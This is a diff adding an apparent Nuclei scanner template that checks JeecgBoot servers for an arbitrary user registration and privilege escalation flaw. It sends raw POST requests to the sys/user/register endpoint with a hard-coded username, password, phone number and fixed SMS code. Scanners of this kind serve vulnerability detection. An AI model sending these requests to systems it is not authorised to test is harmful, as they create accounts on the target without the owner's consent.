@@ -1,0 +1,47 @@
+id: jeecg-boot-any-user-register
+
+info:
+  name: Jeecg-Boot 任意用户注册漏洞
+  author: qwtd
+  severity: high
+  description: |
+    JeecgBoot-企业级低代码平台sys/user/register存在任意用户注册、权限提升漏洞
+  reference:
+    - https://github.com/byXewl/book/blob/eac4bb264e23ee8f74538961a28c3212ace40452/jeecgboot%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%E5%8C%85.md?plain=1#L157
+  tags: Jeecg-Boot
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/sys/user/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "companyName": "1354320251801604098",
+          "password": "cb362cfeefbf3d8d",
+          "phone": "17738814259",
+          "username": "test3312",
+          "smscode":"111111"
+        }
+
+      - |
+        POST /sys/user/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "companyName": "1354320251801604098",
+          "password": "cb362cfeefbf3d8d",
+          "phone": "17738814259",
+          "username": "test3312",
+          "smscode":"111111"
+        }
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"注册成功") && contains(body_1,"true")
+          - status_code_1 == 200 && contains(body_1,"用户名已注册") && contains(body_1,"false")
+        condition: or
